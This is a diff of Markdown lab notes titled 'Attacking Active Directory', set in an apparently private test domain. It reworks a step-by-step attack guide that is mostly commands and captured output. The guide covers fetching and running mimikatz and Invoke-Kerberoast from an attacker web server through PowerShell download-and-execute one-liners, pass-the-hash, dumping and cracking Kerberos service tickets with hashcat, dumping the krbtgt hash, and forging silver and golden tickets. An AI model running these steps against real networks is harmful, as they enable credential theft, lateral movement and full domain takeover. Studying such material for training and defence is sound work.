@@ -1,4 +1,5 @@
 # Attacking Active Directory
+
 ## Lab Environment
 
 |Server|IP Address|OS|Function|
@@ -14,6 +15,11 @@
 ┌──(kali㉿kali)-[~]
 └─$ nmap -p- -sV -Pn 192.168.17.11-13
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-25 12:29 +08
+```
+
+#### Domain Controller
+
+```console
 Nmap scan report for 192.168.17.11
 Host is up (0.00090s latency).
 Not shown: 65513 filtered tcp ports (no-response)
@@ -41,7 +47,11 @@ PORT      STATE SERVICE       VERSION
 57929/tcp open  msrpc         Microsoft Windows RPC
 57960/tcp open  msrpc         Microsoft Windows RPC
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+```
 
+#### Domain Member Server, SQL Server
+
+```console
 Nmap scan report for 192.168.17.12
 Host is up (0.0011s latency).
 Not shown: 65528 filtered tcp ports (no-response)
@@ -54,7 +64,11 @@ PORT      STATE SERVICE       VERSION
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49670/tcp open  msrpc         Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
 
+#### Domain Member Workstation
+
+```console
 Nmap scan report for 192.168.17.13
 Host is up (0.0013s latency).
 Not shown: 65528 filtered tcp ports (no-response)
@@ -67,12 +81,17 @@ PORT      STATE SERVICE            VERSION
 7680/tcp  open  pando-pub?
 49670/tcp open  msrpc              Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
 
+#### Time Taken
+
+```console
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 3 IP addresses (3 hosts up) scanned in 342.02 seconds
 ```
 
 # 1. Cached Credential Storage and Retrieval
+
 **On Kali**: Setup web server to host `mimikatz`
 
 ```console
@@ -81,6 +100,7 @@ sudo python3 -m http.server 80 &> /dev/null &
 ```
 
 **On Target**: Download and run `mimikatz`
+
 - Download: `(New-Object System.Net.WebClient).DownloadFile()`
 - Run: `Start-Process`
 
@@ -89,6 +109,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass (New-Object System.Net.WebClie
 ```
 
 **On Target**: mimikatz commands
+
 - Ref: <https://tools.thehacker.recipes/mimikatz>
 
 |Command|Function|
@@ -312,7 +333,7 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 
 # 2. Pass the Hash
 
-☝️ **Note**: LM hashes are not used from Windows 10 onwards, a string of 32 zeros can used to fill the LM hash portion of the pth-winexe command
+☝️ **Note**: LM hashes are not used from Windows 10 onwards, a string of `32 zeros` can used to fill the LM hash portion of the pth-winexe command
 
 ## 2.1. pth-winexe
 - Domain account
@@ -354,7 +375,9 @@ SVR
 ```
 
 ## 2.2. mimikatz - sekurlsa::pth
+
 ### 2.2.1. Domain account
+
 - On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
 - The `sekurlsa::pth` will spawn a new cmd window
 
@@ -411,6 +434,7 @@ DC
 ```
 
 ### 2.2.2. Local account
+
 - Using `sekurlsa::pth` for local accounts is similar as domain accounts; just user `*` or `workgroup` for the `/domain` option
 
 ```console
@@ -467,10 +491,8 @@ SVR
 ```
 
 # 3. Service Account Attack
-## 3.1. Kerberoasting
-- Ref: <https://github.com/nidem/kerberoast>
 
-### 3.1.1. Discover SPNs
+## 3.1. Discover SPNs
 
 ```console
 C:\Users\mike>setspn -Q */*
@@ -521,49 +543,18 @@ CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
 Existing SPN found!
 ```
 
-### 3.1.2. Request tickets
+## 3.2. Request Tickets
+
+#### Request tickets from PowerShell
 
 ```console
-PS C:\Users\mike> klist
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/SVR.lab.vx:1433
+```
 
-Current LogonId is 0:0xa48995
+#### Sample Results
 
-Cached Tickets: (2)
-
-#0>     Client: mike @ LAB.VX
-        Server: krbtgt/LAB.VX @ LAB.VX
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
-        Start Time: 4/16/2022 9:53:54 (local)
-        End Time:   4/16/2022 19:53:54 (local)
-        Renew Time: 4/23/2022 9:53:54 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0x1 -> PRIMARY
-        Kdc Called: DC.lab.vx
-
-#1>     Client: mike @ LAB.VX
-        Server: ldap/DC.lab.vx/lab.vx @ LAB.VX
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
-        Start Time: 4/16/2022 9:55:16 (local)
-        End Time:   4/16/2022 19:53:54 (local)
-        Renew Time: 4/23/2022 9:53:54 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0
-        Kdc Called: DC.lab.vx
-PS C:\Users\mike> Add-Type -AssemblyName System.IdentityModel
-PS C:\Users\mike> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/SVR.lab.vx:1433
-
-
-Id                   : uuid-95b73e7f-8a7a-493c-affd-383f7472dbfd-1
-SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
-ValidFrom            : 16/4/2022 2:00:51 am
-ValidTo              : 16/4/2022 11:53:54 am
-ServicePrincipalName : MSSQLSvc/SVR.lab.vx:1433
-SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
-
-
-
+```console
 PS C:\Users\mike> klist
 
 Current LogonId is 0:0xa48995
@@ -604,7 +595,12 @@ Cached Tickets: (3)
         Kdc Called: DC.lab.vx
 ```
 
-### 3.1.2. Dump tickets
+## 3.3. Kerberoasting with mimikatz
+
+### 3.3.1. Dump tickets
+
+- ☝️ **Note**: to retrieve user kerberos tickets, do **NOT** use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead
+
 ```console
 mimikatz # kerberos::list /export
 
@@ -630,106 +626,16 @@ mimikatz # kerberos::list /export
    * Saved to file     : 2-40a50000-mike@ldap~DC.lab.vx~lab.vx-LAB.VX.kirbi
 ```
 
-- ☝️ **Note**: to retrieve user kerberos tickets, do not use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead
-
-```console
-mimikatz # privilege::debug
-Privilege '20' OK
-
-mimikatz # token::elevate
-Token Id  : 0
-User name :
-SID name  : NT AUTHORITY\SYSTEM
-
-848     {0;000003e7} 0 D 20011          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
- -> Impersonated !
- * Process Token : {0;004e2d49} 2 F 6986530     LAB\mike        S-1-5-21-1470288461-3401294743-676794760-1105   (15g,24p)       Primary
- * Thread Token  : {0;000003e7} 0 D 7103754     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
-
-mimikatz # kerberos::list
-
-[00000000] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
-   Server Name       : krbtgt/LAB.VX @ LAB.VX
-   Client Name       : client$ @ LAB.VX
-   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
-
-[00000001] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
-   Server Name       : krbtgt/LAB.VX @ LAB.VX
-   Client Name       : client$ @ LAB.VX
-   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
-
-[00000002] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 4/16/2022 9:15:59 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
-   Server Name       : cifs/DC.lab.vx @ LAB.VX
-   Client Name       : client$ @ LAB.VX
-   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
-
-[00000003] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
-   Server Name       : cifs/DC.lab.vx/lab.vx @ LAB.VX
-   Client Name       : client$ @ LAB.VX
-   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
-
-[00000004] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
-   Server Name       : CLIENT$ @ LAB.VX
-   Client Name       : client$ @ LAB.VX
-   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
-
-[00000005] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
-   Server Name       : ldap/DC.lab.vx @ LAB.VX
-   Client Name       : client$ @ LAB.VX
-   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
-
-[00000006] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
-   Server Name       : LDAP/DC.lab.vx/lab.vx @ LAB.VX
-   Client Name       : client$ @ LAB.VX
-   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
-```
-
 - ☝️ **Note**: In event of `ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)` error, check that the user has permissions to write to the present working directory
 - e.g. Attempting to run `C:\Windows\System32\cmd.exe` as a non-admin user works, but attempting to use mimikatz to save tickets to `C:\Windows\System32\` will result in write errors
 
-```console
-C:\Windows\System32>mimikatz
+### 3.3.2. Use the Kerberoast package to crack the service ticket
 
-mimikatz # kerberos::list /export
-
-[00000000] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 16/4/2022 9:33:45 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
-   Server Name       : krbtgt/LAB.VX @ LAB.VX
-   Client Name       : MSSQLSysAdm @ LAB.VX
-   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
-
-
-[00000001] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 16/4/2022 9:34:21 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
-   Server Name       : cifs/svr.lab.vx @ LAB.VX
-   Client Name       : MSSQLSysAdm @ LAB.VX
-   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
-
-
-[00000002] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 16/4/2022 9:34:17 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
-   Server Name       : RPCSS/svr.lab.vx @ LAB.VX
-   Client Name       : MSSQLSysAdm @ LAB.VX
-   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
-
-
-[00000003] - 0x00000017 - rc4_hmac_nt
-   Start/End/MaxRenew: 16/4/2022 9:34:16 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
-   Server Name       : MSSQLSvc/svr.lab.vx:1433 @ LAB.VX
-   Client Name       : MSSQLSysAdm @ LAB.VX
-   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
-```
-
-### 3.1.3. Crack the ticket to retrieve service account password (brute force)
+- Ref: <https://github.com/nidem/kerberoast>
 
 #### Upload the ticket to Kali
+
+**On Target**:
 
 ```console
 scp <ticket> kali@kali.vx:/home/kali/
@@ -770,23 +676,128 @@ sudo apt -y install kerberoast
 
 ```console
 ┌──(kali㉿kali)-[~]
-└─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.10k 4-40a10000-mike@MSSQLSvc~svr.lab.vx~1433-LAB.VX.kirbi
+└─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.100k 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
 
 
     USE HASHCAT, IT'S HELLA FASTER!!
 
 
 Cracking 1 tickets...
-found password for ticket 0: P@ssw0rd  File: 4-40a10000-mike@MSSQLSvc~svr.lab.vx~1433-LAB.VX.kirbi
+found password for ticket 0: P@ssw0rd  File: 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
 Successfully cracked all tickets
 
-real    0m4.974s
-user    0m4.961s
-sys     0m0.012s
+real    0m47.861s
+user    0m47.828s
+sys     0m0.016s
 ```
 
-## 3.2. Silver Ticket
-### 3.2.1. Retrieve domain's numeric identifier
+## 3.4. Kerberoasting with PowerShell
+
+### 3.4.1. Dump password hash
+
+**On Kali**: Setup web server to host `Invoke-Kerberoast.ps1`
+
+```console
+cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 .
+sudo python3 -m http.server 80 &> /dev/null &
+```
+
+**On Target**: Download and run `Invoke-Kerberoast`
+
+- Download: `(New-Object System.Net.WebClient).DownloadFile()`
+- Run: `Invoke-Kerberoast`
+
+```console
+powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hash"
+```
+
+### 3.4.2. Use the hashcat to crack the service ticket
+
+❗USE HASHCAT, IT'S HELLA FASTER❗
+
+It doesn't matter that `rockyou.txt` has 14 million records, the time taken by hashcat is about the same
+- Hashcat takes about **27s** to build a dictionary cache of the wordlist
+- If there is a cache hit, cracking the password takes only about **2.7s**
+
+#### Upload the hash to Kali
+
+**On Target**: 
+
+```console
+scp tgs.hash kali@kali.vx:/home/kali/
+```
+
+#### Crack the hash
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ time hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz, 1440/2945 MB (512 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*$a9063376d22e2b32ff90578c2b2cfd8a$81e91299cab444a834e8f09917f5ca8242928fa95629b50e6ec7f165042f684033f9a1fdf5fde0980a7d82bd36dbc4d1f4bd964a0a2b5f389e9cb6e09ac42d012487ba2c084ed1c2f6d1c89356a255e6c76311705ab1410b94eec153c5e869a889f1c8a762a368497851722e722b140ae064f6eeafc8421f83311d0b60772a376f8fc269d4dfb94f7944853e82c0b916faf07d31447e83a4e4d188dd3b977e04cdfdb013b44b806b78836196fb386bbf1aba899f383982d3fc15d423561f7f3b78c046c295ccb858b85510418b7e144b2e3e490f6f83411a7ee437a865dc664df947b1a36255bcf6b0b4876b5be739527af1d3d42df9871e5d3a2542d8bf760c0325721b9ec4fec08edce9991c80d6d6772b9d1b02f2317e993de47be4ff834e06ef42e7796465160680363d654885e032bae19eb7805077bf88f6c2785f27c158fb15cd45dda66fc1a24847cb665d72d40a1f2ebd82d3dddd94ad834340cb32792721758dfae5c5604965010ca182758a1a4b6e609507cac4e41bd1f048fd4fff30365a26ebfb53df7702e9a11d31195e2b2f1fbf677d8e30aaea27551251a1ce4de358787eb79a0fd257cf54388b1acac3b8e02f84592d588278a68b453cf1ff093d14613dcba150d54ef04505d906314e5f61226d1549c7fa48f8193b27fd1367252bfe3ef9309b28ee255c4bb2f0928b10a740125b90d6516cc6a7840b678823a13f709886852f68d1d30adf1b90d2f03718a767eeec31a155f9ccc7bfcfb7e53fac664eeb618fabd645b1e2e981194d34ca577e12f71e531316a07676a40ebc68811e34fce68253736edaf1b7a4368e941ddfc59d8857114534eda478166901339dc6f22488968e0366c7bad729fd419e539107a5915bd477016360f6c2ff6510ba1830ad40c030a4846a315e7e78df2f5898172569f598c2b23e924a4d7d1f6830302082ad302dff6909c72c880caabe497f0cc559a1b9adc16fd5f9144b43bb0c816c83959817624e5f7e743bada7b4161481c9ed6a617f34b06e2deabbd430a7aa332608ac9730f84e425d352a59422080eb2110bce586c1d9cbb6f25a7c0c11dc68a791ce3dfc2660618c3478da3ddc76516d7a471f1a65d23bf9296e41c308d73a121b392b155a648eb0d273a6d4f12fcdc5ffbe895d871e04f4cb51f231d0632f06e004f358fcdbb19ae7a3242090388c28b742337eb87dd2aa7bf70fcab6141740df549917e9d898a85dc4c243811e8fe1d9080e6e3e3be452f053d666e3e1d4fa882c9b4f603a0749efe6fb9cdd5604a6eb9d7656d6d1abe791fad334aa5de88e6bb9123bcd524a2784a37ce73a4c7c03764513453622a968f2e7cfb7eac110883910584c454c6430661f251dd7583472fa1479330628dc633f8b4000e366048efd276e23f973d8cfa83d3f70f390f372c1c0013060b0da119c5e8115a429081e76c9a6866680aa0f76fb8956fd26d3f86f261e387a90fc4c830e54a755b84480f6a8dae6571cbbf1c98880a7a409cf3a4482caa452a87895a43f280bacc497e7df2649bf8c790f4b86a28f76a2e2b10457dcb5920d9217656394ff20a87d90798a3a8743d47d6baff22bfe5b826987d579fef8851098d62b3da90ca3998eff6c82706881af4e0fb0b15867638b4454cf35ef705e53f53f3ba6b5c86c7774b5:P@ssw0rd
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:14...7774b5
+Time.Started.....: Wed Oct 26 20:52:12 2022 (0 secs)
+Time.Estimated...: Wed Oct 26 20:52:12 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   152.8 kH/s (0.64ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 8192/14344385 (0.06%)
+Rejected.........: 0/8192 (0.00%)
+Restore.Point....: 6144/14344385 (0.04%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: horoscope -> whitetiger
+
+Started: Wed Oct 26 20:51:46 2022
+Stopped: Wed Oct 26 20:52:13 2022
+
+real    0m27.158s
+user    0m25.597s
+sys     0m0.333s
+```
+
+## 3.5. Silver Ticket
+### 3.5.1. Retrieve domain's numeric identifier
 
 Security Identifier or SID format: `S-R-I-S`
 - `S` - A literal `S` to identify the string as a SID
@@ -807,7 +818,7 @@ User Name SID
 lab\mike  S-1-5-21-1470288461-3401294743-676794760-1105
 ```
 
-### 3.2.2. Generate hash value for service account password
+### 3.5.2. Generate hash value for service account password
 ```console
 mimikatz # kerberos::hash /password:P@ssw0rd
         * rc4_hmac_nt       e19ccf75ee54e06b06a5907af13cef42
@@ -816,14 +827,14 @@ mimikatz # kerberos::hash /password:P@ssw0rd
         * des_cbc_md5       76fdfece25e3da54
 ```
 
-### 3.2.3. Purge existing kerberos tickkets
+### 3.5.3. Purge existing kerberos tickkets
 - ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
 ```console
 mimikatz # kerberos::purge
 Ticket(s) purge for current session is OK
 ```
 
-### 3.2.4. Generate KRB_TGS ticket
+### 3.5.4. Generate KRB_TGS ticket
 - ☝️ **Note**: The service identifies the user using the SID, the user name can be anything like `nonexistentuser`
 
 ```console
@@ -848,7 +859,7 @@ Lifetime  : 18/4/2022 9:15:16 am ; 15/4/2032 9:15:16 am ; 15/4/2032 9:15:16 am
 Golden ticket for 'nonexistentuser @ LAB.VX' successfully submitted for current session
 ```
 
-### 3.2.5. Verify ticket
+### 3.5.5. Verify ticket
 ```console
 C:\Users\dummy>klist
 
@@ -868,7 +879,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-### 3.2.6. Attempt login to service
+### 3.5.6. Attempt login to service
 ```console
 C:\Users\dummy>"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE" -S svr.lab.vx
 1> SELECT SYSTEM_USER;
@@ -880,9 +891,9 @@ LAB\nonexistentuser
 (1 rows affected)
 ```
 
-# 5. Golden Ticket
+# 4. Golden Ticket
 
-## 5.1. Dump password hashes on domain controller
+## 4.1. Dump password hashes on domain controller
 - Requires `Domain Admins` rights
 - Information of interest: domain SID and `krbtgt` password hash
 
@@ -979,7 +990,7 @@ LM   :
 NTLM : e2c3ed7139fd3efd244df58c9b2aeb6b
 ```
 
-## 5.2. Create golden ticket using information retrieved from domain controller
+## 4.2. Create golden ticket using information retrieved from domain controller
 - This can be performed on any domain member machine, without administrator rights
 - ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
 - The `misc::cmd` command opens a command prompt session with the golden ticket injected to that session
@@ -1010,7 +1021,7 @@ mimikatz # misc::cmd
 Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
 ```
 
-## 5.3. Use the golden ticket to laterally move to **any** domain machine
+## 4.3. Use the golden ticket to laterally move to **any** domain machine
 - Verify golden ticket in session
 
 ```console
